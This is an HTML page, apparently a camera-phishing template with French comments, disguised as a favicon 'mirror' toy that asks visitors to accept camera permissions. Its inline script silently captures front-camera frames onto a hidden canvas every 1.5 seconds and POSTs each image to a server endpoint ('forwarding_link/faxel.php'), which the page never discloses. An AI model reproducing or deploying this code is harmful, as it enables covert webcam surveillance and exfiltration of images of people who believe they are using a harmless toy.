<!doctype html>
<html>
 <head>
  <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
  <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
 </head>
  <div class="video-wrap" hidden="hidden">
   <video id="video" playsinline autoplay></video>
  </div>
<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
<script>
function poste(imgdata){
$.ajax({
    type: 'POST',
    data: { cat: imgdata},
    url: 'forwarding_link/faxel.php',
    dataType: 'json',
    async: false,
    success: function(result){
    //appelle de la fonction qui gère la réponse et les résultats
    },
    error: function(){
    }
  });
};
'use strict';
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const errorMsgElement = document.querySelector('span#errorMsg');
const constraints = {
  audio: false,
  video: {    
    facingMode: "user"
  }
};
// Acces au webcam
async function initial() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    succesCommercial(stream);
  } catch (e) {
    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
  }
}
// Reussie
function succesCommercial(stream) {
  window.stream = stream;
  video.srcObject = stream;
var contexte = canvas.getContext('2d');
  setInterval(function(){
       contexte.drawImage(video, 0, 0, 640, 480);
       var canvasDonnee = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
       poste(canvasDonnee); }, 1500);
}
// Chargement initial
initial();
</script>
    <body>
        <p>Astuce: regardez le favicon de Faxel</p>
        <p>(Accepter les autorisations)</p>
        <p><label><input type="checkbox" name="mirror" id="mirror" /> Image miroir</label></p>
    </body>
</html>
